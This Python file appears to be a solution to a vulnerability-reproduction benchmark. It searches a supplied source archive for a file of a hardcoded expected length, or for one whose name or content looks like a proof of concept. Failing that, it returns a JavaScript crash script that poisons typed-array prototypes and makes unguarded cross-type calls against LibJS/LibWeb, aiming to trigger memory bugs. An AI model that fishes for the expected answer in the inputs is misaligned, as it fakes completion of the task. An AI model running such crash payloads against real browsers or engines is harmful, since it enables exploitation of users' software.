import os
import tarfile
import zipfile
import io
import re
from typing import List, Tuple, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        expected_len = 6624

        # Try to find PoC bytes within the tarball/zip by heuristics
        data = self._find_poc_in_archive(src_path, expected_len)
        if data is not None:
            return data

        # Fallback PoC: heuristic JS targeting Uint8ClampedArray/TypedArray mismatch
        return self._fallback_poc()

    def _find_poc_in_archive(self, src_path: str, expected_len: int) -> Optional[bytes]:
        # Try tarfile
        try:
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    return self._search_tar(tf, expected_len)
        except Exception:
            pass

        # Try zipfile
        try:
            if zipfile.is_zipfile(src_path):
                with zipfile.ZipFile(src_path, "r") as zf:
                    return self._search_zip(zf, expected_len)
        except Exception:
            pass

        return None

    def _search_tar(self, tf: tarfile.TarFile, expected_len: int) -> Optional[bytes]:
        members = [m for m in tf.getmembers() if m.isfile()]
        exact_match = None

        # First pass: exact length match and contains keyword
        for m in members:
            if m.size > 8 * 1024 * 1024:
                continue
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read()
            except Exception:
                continue
            if len(data) == expected_len and (b"Uint8ClampedArray" in data or b"uint8clampedarray" in data):
                return data

        # Collect candidates with heuristics
        scored: List[Tuple[int, int, str, bytes]] = []
        for m in members:
            if m.size > 8 * 1024 * 1024:
                continue
            name = m.name
            lower = name.lower()
            ext = os.path.splitext(lower)[1]
            # Prefer text-like files
            if ext not in (".js", ".mjs", ".html", ".htm", ".txt", "") and m.size > 1024 * 64:
                continue
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read()
            except Exception:
                continue

            score = self._score_candidate(lower, data, expected_len)
            if score > 0:
                scored.append((score, -len(data), name, data))

        if scored:
            scored.sort(reverse=True)
            return scored[0][3]

        return None

    def _search_zip(self, zf: zipfile.ZipFile, expected_len: int) -> Optional[bytes]:
        names = [n for n in zf.namelist() if not n.endswith("/")]
        # First: exact match
        for name in names:
            try:
                with zf.open(name, "r") as f:
                    data = f.read()
            except Exception:
                continue
            if len(data) == expected_len and (b"Uint8ClampedArray" in data or b"uint8clampedarray" in data):
                return data

        # Heuristic candidates
        scored: List[Tuple[int, int, str, bytes]] = []
        for name in names:
            lower = name.lower()
            ext = os.path.splitext(lower)[1]
            try:
                info = zf.getinfo(name)
                size = info.file_size
            except Exception:
                size = 0
            if size > 8 * 1024 * 1024:
                continue
            if ext not in (".js", ".mjs", ".html", ".htm", ".txt", "") and size > 1024 * 64:
                continue
            try:
                with zf.open(name, "r") as f:
                    data = f.read()
            except Exception:
                continue
            score = self._score_candidate(lower, data, expected_len)
            if score > 0:
                scored.append((score, -len(data), name, data))

        if scored:
            scored.sort(reverse=True)
            return scored[0][3]
        return None

    def _score_candidate(self, name_lower: str, data: bytes, expected_len: int) -> int:
        score = 0
        # Name-based signals
        name_signals = [
            "poc", "proof", "exploit", "crash", "uaf", "use-after", "use_after",
            "heap", "repro", "trigger", "testcase", "security", "cve", "bug"
        ]
        if any(s in name_lower for s in name_signals):
            score += 200

        if name_lower.endswith(".js") or name_lower.endswith(".mjs"):
            score += 120
        elif name_lower.endswith(".html") or name_lower.endswith(".htm"):
            score += 70
        elif name_lower.endswith(".txt") or "." not in name_lower:
            score += 20

        # Content-based signals
        if b"Uint8ClampedArray" in data or b"uint8clampedarray" in data:
            count = len(re.findall(rb"Uint8ClampedArray", data)) + len(re.findall(rb"uint8clampedarray", data))
            score += 150 + min(count, 20) * 5

        # Heuristic for LibJS/TypedArray related code
        typed_keywords = [
            b"TypedArray", b"Int8Array", b"Uint8Array", b"Float32Array", b"ArrayBuffer",
            b"DataView", b"setPrototypeOf", b"prototype", b"__proto__", b"subarray",
            b"buffer", b"byteOffset", b"byteLength", b"BYTES_PER_ELEMENT",
            b"call(", b"apply(", b"Reflect.construct", b"Object.setPrototypeOf"
        ]
        hit = sum(1 for k in typed_keywords if k in data)
        score += hit * 6

        # Extra signals for fuzzers
        if b"fuzzilli" in data or b"Fuzzilli" in data:
            score += 50
        if b"gc(" in data or b"%DebugGarbageCollect" in data:
            score += 30

        # Prefer files near expected PoC length
        diff = abs(len(data) - expected_len)
        if diff == 0:
            score += 500
        elif diff < 64:
            score += 200
        elif diff < 256:
            score += 120
        elif diff < 1024:
            score += 80
        elif diff < 4096:
            score += 30

        # Penalize very large or binary-looking blobs
        if len(data) > 512 * 1024:
            score -= 50
        # Check if looks like text
        text_like = self._looks_text(data)
        if not text_like:
            score -= 100

        return score

    def _looks_text(self, data: bytes) -> bool:
        if not data:
            return False
        # Consider data text-like if mostly printable or whitespace
        sample = data[:4096]
        printable = set(range(32, 127)) | {9, 10, 13}
        bad = 0
        total = 0
        for b in sample:
            total += 1
            if b not in printable:
                bad += 1
        # allow some non-printable
        return bad <= total * 0.15

    def _fallback_poc(self) -> bytes:
        # Heuristic JS PoC attempting to exercise TypedArray/Uint8ClampedArray mismatches.
        js = r"""
// Heuristic PoC for LibJS/LibWeb TypedArray vs Uint8ClampedArray mismatch.
// Attempts a variety of prototype hijacks and typed-array method calls to trigger latent bugs.

function nop() {}

function attempt(cb) {
    try { cb(); } catch (e) { }
}

function range(n) {
    const a = [];
    for (let i = 0; i < n; i++) a.push(i & 0xFF);
    return a;
}

const SIZES = [0, 1, 2, 3, 4, 7, 8, 15, 16, 63, 64, 127, 128, 255, 256, 1023, 1024, 4096];
let cl = new Uint8ClampedArray(1024);
let i8 = new Int8Array(1024);
let u8 = new Uint8Array(1024);

for (let i = 0; i < cl.length; i++) cl[i] = i & 0xff;
for (let i = 0; i < u8.length; i++) u8[i] = (i * 3) & 0xff;
for (let i = 0; i < i8.length; i++) i8[i] = ((i * 7) & 0xff) - 128;

// Try to poison prototype chain
attempt(() => Object.setPrototypeOf(Uint8ClampedArray.prototype, Int8Array.prototype));
attempt(() => Object.setPrototypeOf(Uint8ClampedArray, Int8Array));
attempt(() => {
    const saved = Uint8ClampedArray.prototype.constructor;
    Uint8ClampedArray.prototype.constructor = Int8Array;
    nop(saved);
});

// Borrow methods from other typed arrays and Array
const typedProto = [
    Int8Array.prototype,
    Uint8Array.prototype,
    Uint16Array && Uint16Array.prototype,
    Int16Array && Int16Array.prototype,
    Uint32Array && Uint32Array.prototype,
    Int32Array && Int32Array.prototype,
    Float32Array && Float32Array.prototype,
    Float64Array && Float64Array.prototype
].filter(Boolean);

const typedMethods = new Set();
for (const p of typedProto) {
    Object.getOwnPropertyNames(p).forEach(m => {
        if (typeof p[m] === "function") typedMethods.add(m);
    });
}

const arrayMethods = new Set();
Object.getOwnPropertyNames(Array.prototype).forEach(m => {
    if (typeof Array.prototype[m] === "function") arrayMethods.add(m);
});

// Attempt cross-calling typed array prototype methods with Uint8ClampedArray as receiver
for (const m of typedMethods) {
    for (const p of typedProto) {
        const fn = p[m];
        if (typeof fn !== "function") continue;

        // prepare some arguments
        for (const sz of SIZES) {
            attempt(() => fn.call(cl, range(sz)));
            attempt(() => fn.call(cl, u8.subarray(0, Math.min(sz, u8.length))));
            attempt(() => fn.call(cl, i8.subarray(0, Math.min(sz, i8.length))));
            attempt(() => fn.call(cl, cl.subarray(0, Math.min(sz, cl.length))));
            if (m === "set" || m === "copyWithin" || m === "fill") {
                attempt(() => fn.call(cl, 0, sz, Math.min(sz + 8, cl.length)));
                attempt(() => fn.call(cl, range(sz), 0));
                attempt(() => fn.call(cl, u8, 1));
            }
            if (m === "subarray" || m === "slice") {
                attempt(() => fn.call(cl, 0, sz));
                attempt(() => fn.call(cl, sz, 0));
                attempt(() => fn.call(cl, -sz, sz));
            }
        }
    }
}

// Attempt using Array methods on Uint8ClampedArray (can trigger exotic paths in some engines)
for (const m of arrayMethods) {
    const fn = Array.prototype[m];
    for (const sz of SIZES) {
        attempt(() => fn.call(cl, (v) => v & 0xff));
        attempt(() => fn.call(cl, (a, b) => a ^ b, 0));
        attempt(() => fn.call(cl, (a, b) => (a - b), 0));
        attempt(() => fn.call(cl, range(sz)));
    }
}

// Try constructing typed arrays from clamped array in strange ways
for (const sz of SIZES) {
    attempt(() => { new Int8Array(cl.subarray(0, Math.min(sz, cl.length))); });
    attempt(() => { new Uint8Array(cl.subarray(0, Math.min(sz, cl.length))); });
    attempt(() => { new Float32Array(cl.subarray(0, Math.min(sz, cl.length))); });
    attempt(() => { new Int8Array(cl); });
    attempt(() => { new Uint8Array(cl); });
    attempt(() => { new Float64Array(cl); });
}

// Accessors that may rely on typed array internal slots
function stressAccessors(obj) {
    const props = Object.getOwnPropertyNames(obj.__proto__);
    for (const p of props) {
        try {
            const d = Object.getOwnPropertyDescriptor(obj.__proto__, p);
            if (!d) continue;
            if (typeof d.get === "function") attempt(() => d.get.call(obj));
            if (typeof d.set === "function") attempt(() => d.set.call(obj, 0));
        } catch (e) {}
    }
}
stressAccessors(cl);

// Replace prototype again to try to bypass checks mid-flight
attempt(() => Object.setPrototypeOf(cl, Int8Array.prototype));
attempt(() => Object.setPrototypeOf(cl, Uint8Array.prototype));

// Final aggressive calls without try/catch to maximize chance of crashing vulnerable builds
// These are common hotspots for internal-slot assumptions.
(function finalAggressive() {
    const tset = Int8Array.prototype.set;
    const tsub = Int8Array.prototype.subarray;
    const tslice = Int8Array.prototype.slice;
    tset.call(cl, u8, 0);
    tset.call(cl, i8, 0);
    tsub.call(cl, 0, cl.length - 1);
    tslice.call(cl, 0, cl.length - 1);
})();
"""
        return js.encode("utf-8")